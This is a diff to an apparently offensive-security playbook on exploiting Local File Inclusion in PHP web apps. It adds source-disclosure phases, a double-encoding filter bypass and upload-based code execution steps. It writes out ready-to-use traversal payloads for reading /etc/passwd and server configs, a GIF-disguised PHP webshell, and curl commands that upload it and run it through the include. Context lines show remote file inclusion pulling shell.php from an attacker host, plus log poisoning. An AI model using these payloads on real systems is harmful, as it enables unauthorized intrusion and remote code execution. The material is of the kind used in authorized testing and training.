@@ -14,6 +14,8 @@
 | Java `import` | ✅ | ✅ | ✅ |
 | .NET `include` | ✅ | ✅ | ✅ |
 
+**How to identify the function:** If the LFI parameter is in an image/file-serving endpoint, it likely uses `file_get_contents()` or `readfile()` (read-only). Use `php://filter` or the read-only LFI itself to read the PHP source and confirm. A read-only LFI is still valuable — use it for source disclosure to find a second `include()`-based LFI elsewhere in the app.
+
 ---
 
 ## Phase 1 — Identify the Vulnerability
@@ -73,7 +75,9 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 # Encode all chars including dots
 ?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 
-# Double encode (bypasses filters that decode once before checking)
+# Double encode — for "check then urldecode" pattern:
+# PHP auto-decodes $_GET once (%252F → %2F in $_GET), filter sees no literal / → passes,
+# then urldecode($_GET[...]) → / is used in the include path
 ?language=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fpasswd
 ```
 
@@ -84,7 +88,30 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 
 ---
 
-## Phase 4 — PHP Filters (Source Code Disclosure)
+## Phase 4 — Source Disclosure via Read-Only LFI
+
+When LFI uses `file_get_contents()` or `readfile()`, PHP files are returned as raw source (not executed). Use this to read all PHP files in the app and locate an `include()`-based LFI.
+
+```bash
+# Read PHP source directly (returned as raw text, not executed)
+curl -s "http://<TARGET>/api/image.php?p=....//index.php"
+curl -s "http://<TARGET>/api/image.php?p=....//contact.php"
+curl -s "http://<TARGET>/api/image.php?p=....//api/application.php"
+
+# Read webserver config to find denied dirs, upload paths, PHP version
+curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/nginx/sites-enabled/default"
+curl -s "http://<TARGET>/api/image.php?p=....//....//....//....//etc/apache2/apache2.conf"
+
+# What to look for in source:
+# - include() / require() calls with user-controlled params → second LFI
+# - Upload handlers: how files are named (md5_file()? random? original name?)
+# - Denied directories from nginx/apache config
+# - PHP version (informs which wrappers work)
+```
+
+---
+
+## Phase 5 — PHP Filters (Source Code via php://filter)
 
 ```bash
 # Fuzz for PHP files first
@@ -104,7 +131,7 @@ curl -s "http://<TARGET>/index.php?language=php://filter/read=convert.base64-enc
 
 ---
 
-## Phase 5 — PHP Wrappers (RCE)
+## Phase 6 — PHP Wrappers (RCE)
 
 ### Check Prerequisites
 ```bash
@@ -138,7 +165,7 @@ curl -s "http://<TARGET>/index.php?language=expect://id" | grep uid
 
 ---
 
-## Phase 6 — Remote File Inclusion (RFI)
+## Phase 7 — Remote File Inclusion (RFI)
 
 ### Verify RFI Works
 ```bash
@@ -175,18 +202,30 @@ curl -s "http://<TARGET>/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd
 
 ---
 
-## Phase 7 — LFI + File Upload (RCE)
+## Phase 8 — LFI + File Upload (RCE)
+
+**Before uploading:** Read the upload handler source (via source disclosure LFI or php://filter) to determine:
+- What field name the form uses (`<input name="...">`)
+- Where files are stored and what they're named:
+  - Original filename preserved → use that filename in LFI path
+  - `md5_file($tmp_name)` → hash of file CONTENT; compute locally with `md5sum /tmp/shell.ext`
+  - Random/UUID → may need to find the path from the upload response or a directory listing
+- Whether `include()` appends an extension (e.g. `.php`) — if so, omit it from the LFI traversal
 
 ### Malicious Image Upload
 ```bash
-# Create image with embedded webshell
+# Create image with embedded webshell (GIF8 magic bytes bypass content-type checks)
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif
 
 # Find upload form fields
-curl -s "http://<TARGET>/settings.php" | grep -i "input\|form\|name="
+curl -s "http://<TARGET>/apply.php" | grep -i "input\|form\|name="
 
-# Upload (use correct field name from form)
+# Upload (use correct field name from form source)
 curl -s -F "uploadFile=@/tmp/shell.gif" "http://<TARGET>/upload.php"
+
+# If server uses md5_file() naming — compute hash from the file you uploaded
+md5sum /tmp/shell.gif
+# Use that hash as the filename in the LFI path
 
 # LFI include the uploaded file
 curl -s "http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id" | grep uid
@@ -201,7 +240,7 @@ curl -s "http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23s
 
 ---
 
-## Phase 8 — Log Poisoning (RCE)
+## Phase 9 — Log Poisoning (RCE)
 
 ### PHP Session Poisoning
 ```bash
@@ -243,7 +282,7 @@ curl -s "http://<TARGET>/index.php?language=/proc/self/environ&cmd=id" \
 
 ---
 
-## Phase 9 — Automated Scanning
+## Phase 10 — Automated Scanning
 
 ```bash
 # 1. Get baseline size (default content)
@@ -277,13 +316,25 @@ Found LFI parameter?
             └─ Prefix with approved path (check nav links!)
        └─ Empty response? → str_replace('../') filter
             └─ Use ....// instead of ../
-       └─ Still blocked? → URL encode the traversal
+       └─ Still blocked? → URL encode, then double URL encode
+            (double encode for "check-then-urldecode" pattern)
 
-Goal is RCE?
+Determine LFI function capability:
+  └─ Read PHP source (via php://filter or read-only LFI path)
+  └─ file_get_contents() / readfile() → READ ONLY
+       └─ Use for source disclosure: read all .php files + webserver config
+       └─ Look for include()/require() with user-controlled params elsewhere
+       └─ Look for upload handler: how are files named? (md5_file? original? random?)
+  └─ include() / require() → CAN EXECUTE PHP → proceed to RCE
+
+Goal is RCE (via include/require LFI)?
   └─ Check allow_url_include via php://filter on php.ini
-       └─ ON → try data://, then php://input, then expect://
+       └─ ON → try php://input, then data://, then expect://
   └─ Can upload files?
        └─ YES → GIF8 magic bytes + PHP shell → LFI include
+       └─ Check upload handler source for file naming scheme
+            └─ md5_file() → compute hash locally: md5sum /tmp/shell.ext
+            └─ Extension appended by include()? → omit ext from traversal
   └─ Can poison a log?
        └─ Try session file (most reliable)
        └─ Try Nginx access.log (readable by www-data)
